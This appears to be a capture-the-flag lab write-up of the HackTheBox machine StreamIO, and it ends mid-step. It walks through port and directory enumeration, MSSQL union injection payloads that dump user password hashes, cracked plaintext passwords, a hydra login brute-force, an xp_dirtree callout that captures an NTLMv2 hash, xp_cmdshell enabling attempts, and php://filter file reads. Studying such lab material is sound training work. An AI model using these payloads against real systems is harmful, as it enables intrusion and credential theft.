# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.11.158
nmap -sU --top-ports=10 -vv 10.10.11.158

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-16 22:45:27Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a:2c8d:a0b8:b10a:eefa:be20:4abd:ecaf
| SHA-1: 6c6a:3f5c:7536:61d5:2da6:0e66:75c0:56ce:56e4:656d
| -----BEGIN CERTIFICATE-----
| MIIDYjCCAkqgAwIBAgIUbdDRZxR55nbfMxJzBHWVXcH83kQwDQYJKoZIhvcNAQEL
| BQAwIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0cmVhbUlPMB4XDTIyMDIyMjA3
| MDMyOFoXDTIyMDMyNDA3MDMyOFowIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0
| cmVhbUlPMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2QSO8noWDU+A
| MYuhSMrB2mA+V7W2gwMdTHxYK0ausnBHdfQ4yGgAs7SdyYKXf8fA502x4LvYwgmd
| 67QtQdYtsTSv63SlnEW3zjJyu/dRW0cwMfBCqyiLgAScrxb/6HOhpnOAzk0DdBWE
| 2vobsSSAh+cDHVSuSbEBLqJ0GEL4hcggHhQq6HLRmmrb0wGjL1WIwjQ8cCWcFzzw
| 5Xe3gEe+aHK245qZKrZtHuXelFe72/nbF8VFiukkaBMgoh6VfpM66nMzy+KeLfhP
| FkxBt6osGUHwSnocJknc7t+ySRVTACAMPjbbPGEl4hvNEcZpepep6jD6qgi4k7bL
| 82Nu2AeSIQIDAQABo4GTMIGQMB0GA1UdDgQWBBRf0ALWCgvVfRgijR2I0KY0uRjY
| djAfBgNVHSMEGDAWgBRf0ALWCgvVfRgijR2I0KY0uRjYdjAPBgNVHRMBAf8EBTAD
| AQH/MCsGA1UdEQQkMCKCDHN0cmVhbUlPLmh0YoISd2F0Y2guc3RyZWFtSU8uaHRi
| MBAGA1UdIAQJMAcwBQYDKgMEMA0GCSqGSIb3DQEBCwUAA4IBAQCCAFvDk/XXswL4
| cP6nH8MEkdEU7yvMOIPp+6kpgujJsb/Pj66v37w4f3us53dcoixgunFfRO/qAjtY
| PNWjebXttLHER+fet53Mu/U8bVQO5QD6ErSYUrzW/l3PNUFHIewpNg09gmkY4gXt
| oZzGN7kvjuKHm+lG0MunVzcJzJ3WcLHQUcwEWAdSGeAyKTfGNy882YTUiAC3p7HT
| 61PwCI+lO/OU52VlgnItRHH+yexBTLRB+Oa2UhB7GnntQOR1S5g497Cs3yAciST2
| JaKhcCnBY1cWqUSAm56QK3mz55BNPcOUHLhrFLjIaWRVx8Ro8QOCWcxkTfVcKcR+
| DSJTOJH8
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-16T22:46:34+00:00; +29m23s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/16%Time=68002C39%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18376/tcp): CLEAN (Timeout)
|   Check 2 (port 61631/tcp): CLEAN (Timeout)
|   Check 3 (port 25119/udp): CLEAN (Timeout)
|   Check 4 (port 17769/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 29m20s, deviation: 2s, median: 29m18s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-16T22:45:51
|_  start_date: N/A

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127

```
- Domain `streamio.htb`
- kerberos,smb,ldap
- DNS: `watch.streamIO.htb`
## Directory Enumeration
- Gobuster:
- Directory
```bash
gobuster dir -u http://10.10.11.158 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]


```
- any thing with /* leads to a different error instead of 404 (**not useful**):
- ![[Pasted image 20250416183012.png]]
- Next Directory (HTTPS)
```bash
gobuster dir -u https://watch.streamio.htb dns -k --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
--AND--
gobuster dir -u https://streamio.htb -k dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root2


---OUTPUT-1---
===============================================================
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/Static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/Static/]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]



---OUTPUT-2---
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/Fonts/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 148] [--> https://streamio.htb/CSS/]
/JS                   (Status: 301) [Size: 147] [--> https://streamio.htb/JS/]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]


```
- there is an admin subdirectory which we need authorization to access
- We do the same thing with -x php
```bash
gobuster dir -u https://watch.streamio.htb -x php  dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.roo3t -k
--AND--
gobuster dir -u https://streamio.htb -x php  dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.roo3t -k

---OUTPUT-1---
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
/Index.php            (Status: 200) [Size: 2829]
/INDEX.php            (Status: 200) [Size: 2829]
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/blocked.php          (Status: 200) [Size: 677]
/SEARCH.php           (Status: 200) [Size: 253887]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/Static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/Static/]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
/s%26p                (Status: 400) [Size: 3420]
/%3FRID%3D2671        (Status: 400) [Size: 3420]
/devinmoore*          (Status: 400) [Size: 3420]
/200109*              (Status: 400) [Size: 3420]
/*sa_                 (Status: 400) [Size: 3420]
/*dc_                 (Status: 400) [Size: 3420]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]
/q%26a2               (Status: 400) [Size: 3420]
/login%3f             (Status: 400) [Size: 3420]
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3420]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3420]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================

---OUTPUT-2---
/index.php            (Status: 200) [Size: 13497]
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/contact.php          (Status: 200) [Size: 6434]
/about.php            (Status: 200) [Size: 7825]
/login.php            (Status: 200) [Size: 4145]
/register.php         (Status: 200) [Size: 4500]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/Contact.php          (Status: 200) [Size: 6434]
/About.php            (Status: 200) [Size: 7825]
/Index.php            (Status: 200) [Size: 13497]
/Login.php            (Status: 200) [Size: 4145]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
/Register.php         (Status: 200) [Size: 4500]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
/INDEX.php            (Status: 200) [Size: 13497]
/Fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/Fonts/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 148] [--> https://streamio.htb/CSS/]
/JS                   (Status: 301) [Size: 147] [--> https://streamio.htb/JS/]
/Logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/CONTACT.php          (Status: 200) [Size: 6434]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/ABOUT.php            (Status: 200) [Size: 7825]
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
/s%26p                (Status: 400) [Size: 3420]
/LogIn.php            (Status: 200) [Size: 4145]
/%3FRID%3D2671        (Status: 400) [Size: 3420]
/devinmoore*          (Status: 400) [Size: 3420]
/LOGIN.php            (Status: 200) [Size: 4145]
/200109*              (Status: 400) [Size: 3420]
/*sa_                 (Status: 400) [Size: 3420]
/*dc_                 (Status: 400) [Size: 3420]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]
/q%26a2               (Status: 400) [Size: 3420]
/login%3f             (Status: 400) [Size: 3420]
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3420]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3420]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]
Progress: 441120 / 441122 (100.00%)

```
- for `watch.streamio.htb` search and blocked php lead to 2 pages
- blocked says malicious activity detected
- search allows you to search for different movies
- on plahying with the search it seems sql injectable
- using OR leads to blocked
- We also check /admin :
```bash
gobuster dir -u https://streamio.htb/admin -x php  dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.roo3t -k


---OUTPUT---
/images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/images/]
/index.php            (Status: 403) [Size: 18]
/Images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/Images/]
/css                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/css/]
/Index.php            (Status: 403) [Size: 18]
/js                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/js/]
/master.php           (Status: 200) [Size: 58]
/fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/fonts/]
/IMAGES               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/IMAGES/]
/INDEX.php            (Status: 403) [Size: 18]
/Fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/Fonts/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/CSS/]
/JS                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/JS/]
```
- master.php
- Ffuf the parameters
```bash
ffuf -k -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded' --fl 34

---OUTPUT---
?                       [Status: 200, Size: 1612, Words: 77, Lines: 50, Duration: 40ms]
,                       [Status: 200, Size: 3934, Words: 198, Lines: 114, Duration: 56ms]
/                       [Status: 200, Size: 1303, Words: 58, Lines: 42, Duration: 66ms]
(                       [Status: 200, Size: 1632, Words: 79, Lines: 50, Duration: 55ms]
)                       [Status: 200, Size: 1632, Words: 79, Lines: 50, Duration: 39ms]
-                       [Status: 200, Size: 10048, Words: 513, Lines: 282, Duration: 49ms]
.                       [Status: 200, Size: 6704, Words: 330, Lines: 194, Duration: 60ms]
!                       [Status: 200, Size: 2144, Words: 98, Lines: 66, Duration: 63ms]
:                       [Status: 200, Size: 29151, Words: 1600, Lines: 786, Duration: 76ms]
+                       [Status: 200, Size: 196330, Words: 9846, Lines: 5514, Duration: 102ms]
%                       [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 87ms]
_                       [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 104ms]
&                       [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 84ms]

```
- We see some special characters 
- We try them out as it's important to understand how these things work to inject.
- & ends up giving specific movies
- in ffuf it doesn't url encode so when we try via burpsuite we see we get all list of movies
- % gives all movies.
- we can deduce we *probably* wouldn't have to deal with brackets etc.
- Why? We assume the statement is closer to this as compared to the second command:
```bash
select * from movies where name like '%500%';
select * from movies where CONTAINS (name, '*500*');
```
- the query is adding % for us hence % gives all
## SMB
- smb clinet with no user, guest user and anonymous user doesn't show anything
## Website Enumeration
### Direct
- we check `streamio.htb` and `atch.streamaio.htb`
- both lead to iis sites
- **Check https also**
- `streamio.htb` leads to a streaming site
- input for contact
- some possible users
- Login
- `[oliver@Streamio.htb]`
- input for email
- `watch.streamio.htb` like a database of movies
- possible sql injection

## SQLi with BurpSuite
- MSSQL doesn't have information schema like mysql. there are other references.
- https://learn.microsoft.com/fr-fr/sql/t-sql/language-reference?view=sql-server-ver16
- Reference info > System Catalog views > Objects : for info the sql commands here for enumerating (sys.columns etc)
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- Now we need to figure out how to inject
- We know when we put 500 it leads to 500 days of summer. So in burpsuite when we pass that command we search for that line in the response and mark a search to patch the class
```bash
class="mr-auto p-2
```
- and in settings select auto scroll to match when text changes
- We know this is a successful query
- when we add `'` after, the match goes, because we are ending the query before the `%`
- if we add `500%` we get a match showing the query is succesfful
-  if we add `'-- -` after `500%` we get a match showing the query is succesfful 
- we can inject between these 2
- We try Union Inject
```bash
q=500%' union select 1-- -
q=500%' union select 1,2-- -
q=500%' union select 1,2,3-- -
...
q=500%' union select 1,2,3,4,5,6,7,8,9-- -
```
- No matches and it's probably not more than that
- We can inverse our logic
- `500'` will not return a match so we know its an incorrect query unless our union injection returns something true.
```bash
q=500' union select 1-- -
q=500' union select 1,2-- -
...
q=500' union select 1,2,3,4,5,6-- -
```
- We get a match!
- Can test:
```bash
q=500' union select 1,2,9001,4,5,6-- -
```
- Should find `9001` in response
- Check version, user, db_name:
```bash
q=500' union select 1,@@version,3,4,5,6-- -
q=500' union select 1,user,3,4,5,6-- -
q=500' union select 1,db_name(),3,4,5,6-- -

---RELEVANT-RESPONSE-1---
	<div class="d-flex movie align-items-end">
				<div class="mr-auto p-2">
					<h5 class="p-2">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep 24 2019 13:48:23 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)


---RELEVANT-OUTPUT-2---
			<div class="mr-auto p-2">
					<h5 class="p-2">db_user

---RELEVANT-OUTPUT-3---
			<div class="mr-auto p-2">
					<h5 class="p-2">STREAMIO</h5>
```
- For db_name we can also give an int argument for the database number:
```bash
q=500' union select 1,db_name(1),3,4,5,6-- -
q=500' union select 1,db_name(2),3,4,5,6-- -
q=500' union select 1,db_name(3),3,4,5,6-- -
q=500' union select 1,db_name(4),3,4,5,6-- -
q=500' union select 1,db_name(5),3,4,5,6-- -
q=500' union select 1,db_name(6),3,4,5,6-- -

---OUTPUT---
master
tempdb
model
msdb
streamIO
stremio_backup

```
- Now we need to figure out table structure before e can exfil data.
- sys.objects is where table name. 
- We want the name and id.
- Why id? because in sys.columns machine will reference id not name. (so name for humans, id for machine)
- Also if we see the response packet we can get 2 responses (class 2 and 3)
```bash
q=500' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='u'-- -

---OUTPUT---
 class="d-flex movie align-items-end">
				<div class="mr-auto p-2">
					<h5 class="p-2">movies</h5>
				</div>
				<div class="ms-auto p-2">
					<span class="">885578193</span>
					<button class="btn btn-dark" onclick="unavailable();">Watch</button>
				</div>
			</div><div class="d-flex movie align-items-end">
				<div class="mr-auto p-2">
					<h5 class="p-2">users</h5>
				</div>
				<div class="ms-auto p-2">
					<span class="">901578250
```
- This works because for the SQLi, the code can handle multiple rows. A lot of times it can't.
- We are assuming we can't for learning purposes.
- So for learning purposes we won't use 2 fields just one.
- We use the CONCAT function:
```bash
q=500' union select 1,CONCAT(name,':',id),3,4,5,6 from streamio..sysobjects where xtype='u'-- -

---OUTPUT---
	<div class="d-flex movie align-items-end">
				<div class="mr-auto p-2">
					<h5 class="p-2">movies:885578193</h5>
				</div>
				<div class="ms-auto p-2">
					<span class="">3</span>
					<button class="btn btn-dark" onclick="unavailable();">Watch</button>
				</div>
			</div><div class="d-flex movie align-items-end">
				<div class="mr-auto p-2">
					<h5 class="p-2">users:901578250</h5>
				</div>
				<div class="ms-auto p-2">
```
- Now we want to put them both in one row.
- the equivalent for group_concat is string_agg
```bash
q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..sysobjects where xtype='u'-- -

---OR---
# For a cleaner look, all code at one place
q=500' union select 1,(select string_agg(CONCAT(name,':',id),'|' ) from streamio..sysobjects where xtype='u'),3,4,5,6-- -

---OUTPUT---
	<div class="d-flex movie align-items-end">
				<div class="mr-auto p-2">
					<h5 class="p-2">movies:885578193|users:901578250</h5>
				</div>
				<div class="ms-auto p-2">
```
- movies is table name
- Now we want the column names 
```bash
q=500' union select 1,(select string_agg(name,'|' ) from streamio..syscolumns where id='901578250'),3,4,5,6-- -

---OUTPUT---
<div class="mr-auto p-2">
	<h5 class="p-2">id|is_staff|password|username</h5>
```
- Now e get the data
```bash
q=500' union select 1,(select string_agg(CONCAT(username,':',password),'|' ) from users),3,4,5,6-- -

---OUTPUT---
James                :c660060492d9edcaa8332d89c99c9239                  |
Theodore             :925e5408ecb67aea449373d668b7359e                  |
Samantha             :083ffae904143c4796e464dac33c1f7d                  |
Lauren               :08344b85b329d7efd611b7a7743e8a09                  |
William              :d62be0dc82071bccc1322d64ec5b6c51                  |
Sabrina              :f87d3c0d6c8fd686aacc6627f1f493a5                  |
Robert               :f03b910e2bd0313a23fdd7575f34a694                  |
Thane                :3577c47eb1e12c8ba021611e1280753c                  |
Carmon               :35394484d89fcfdb3c5e447fe749d213                  |
Barry                :54c88b2dbd7b1a84012fabc1a4c73415                  |
Oliver               :fd78db29173a5cf701bd69027cb9bf6b                  |
Michelle             :b83439b16f844bd6ffe35c02fe21b3c0                  |
Gloria               :0cfaaaafb559f081df2befbe66686de0                  |
Victoria             :b22abb47a02b52d5dfa27fb0b534f693                  | Alexendra            :1c2b3d8270321140e5153f6637d3ee53                  |
Baxter               :22ee218331afd081b0dcd8115284bae3                  |
Clara                :ef8f3d30a856cf166fb8215aca93e9ff                  |
Barbra               :3961548825e3e21df5646cafe11c6c76                  |
Lenord               :ee0b8a0937abd60c2882eacb2f8dc49f                  |
Austin               :0049ac57646627b8d7aeaccf8b6a936f                  |
Garfield             :8097cedd612cc37c29db152b6e9edbd3                  |
Juliette             :6dcd87740abb64edfa36d170f0d5450d                  |
Victor               :bf55e15b119860a6e6b5a164377da719                  |
Lucifer              :7df45a9e3de3863807c026ba48e55fb3                  |
Bruno                :2a4e2cf22dd8fcb45adcb91be1e22ae8                  |
Diablo               :ec33265e5fc8c2f1b0c137bb7b3632b5                  |
Robin                :dc332fb5576e9631c9dae83f194f8e70                  |
Stan                 :384463526d288edcc95fc3701e523bc7                  |
yoshihide            :b779ba15cedfd22a023c4d8bcf5f2332                  |
admin                :665a50ac9eaa781e4f7f04199db97a11                  
```
- **EXTRA NOTES**
- Can also try to find user hash by executing xp_dirtree:
```bash
--LOCAL-MACHINE-
sudo responder -i tun0

---BURPSUITE---
q=500' exec xp_dirtree '\\10.10.14.25\share\rocknrj';-- -

-------------------------------------------------
---OUTPUT---
[SMB] NTLMv2-SSP Client   : 10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:0f9539a8f1ae7096:826FA768B196A72172B64A5A13BA4644:01010000000000000011779023AFDB010A49F1381B66201000000000020008004B00310056004F0001001E00570049004E002D00300058004D004500550049004400300049003600360004003400570049004E002D00300058004D00450055004900440030004900360036002E004B00310056004F002E004C004F00430041004C00030014004B00310056004F002E004C004F00430041004C00050014004B00310056004F002E004C004F00430041004C00070008000011779023AFDB01060004000200000008003000300000000000000000000000003000004706ABDEF6139E72C91C526E15ABBDA82A9245B8CB281BA93C28065FFA68CF7A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000 
```
- DC$ is a machine account, not worth cracking hash
- Can also test xp_cmdshell
```bash
---LOCAL-MACHINE---
sudo tcpdump -i tun0

---BURPSUITE---
q=500' exec xp_dirtree 'ping 10.10.14.25';-- -
```
- Doesn't work
- Can try to enable:
```bash
q=500' EXEC sp configue 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master.dbo.xp_cmdshell 'ping 10.10.14.25';-- -
```
- Fails
- The above two are good to test as if we could we wouldnt need to enumerate sql and get a shell directly
## Initial Website Foothold
- Copy to vi file, remove all spaces and replace | with new line:
```bash
vi creds # Copy content
> :%s/[ ]*//g 
> :%s/|/\r/g
> :wq
```
- Can also check with staff :
```bash
q=500' union select 1,(select string_agg(CONCAT(username,':',password,':',is_staff),'|' ) from users),3,4,5,6-- 
```
- Everyone except admin is staff
- We check the word count:
```bash
echo -n "665a50ac9eaa781e4f7f04199db97a11" | wc -c
> 32
```
- Provably MD5
- We then attempt to crack the hashes 
```bash
hashcat -m 0 --user creds /usr/share/wordlists/rockyou.txt
hashcat -m 0 --user creds --show

---OUTPUT---
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
```
- Copy to file `userpass`
- We check the login form via the website and capture via burpsuite to find a text we could use as an identifier. `Login Failed` is chosen. and we also look at the post request (1st line)
- We clean the userpass list for just username and pwd w/o hash:
```bash
cat userpass | awk -F: '{print $1":"$3}' >usrpwn
```
- Then e brute force to find some creds:
```bash
hydra -C userpwn streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"


---OUTPUT---
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
```
- We login to website.
- From our gobuster search we check /admin and /admin/master.php
- admin leads to an admin interface 
- /admin/master.php leads to a kind of error message saying "Movie managment : Only accessable through includes"
- We enumerate with ffuf again :
```bash
ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=jbhccjhri0h4ric2lgnk459cho' -fs 1678

---OUTPUT---
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 36ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 61ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 26ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 31ms]

```
- On enumerating the website we find that for each option in the admin url we click we get `?<name>`
- debug option isn't there but we find it in ffuf.
- on testing debug it first says this option is for developers only
- i put 'test' and it doesn't respond
- Directory traversal also gives no output
- When I put index.php it responds with error
- When I put master.php it shows all the movies 
- We try to get the base64 output with php filter:
```bash
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=master.php
```
- We get an output for index.php and master.php.
- We decrypt the base64 output for index.php and find credentials:
```bash
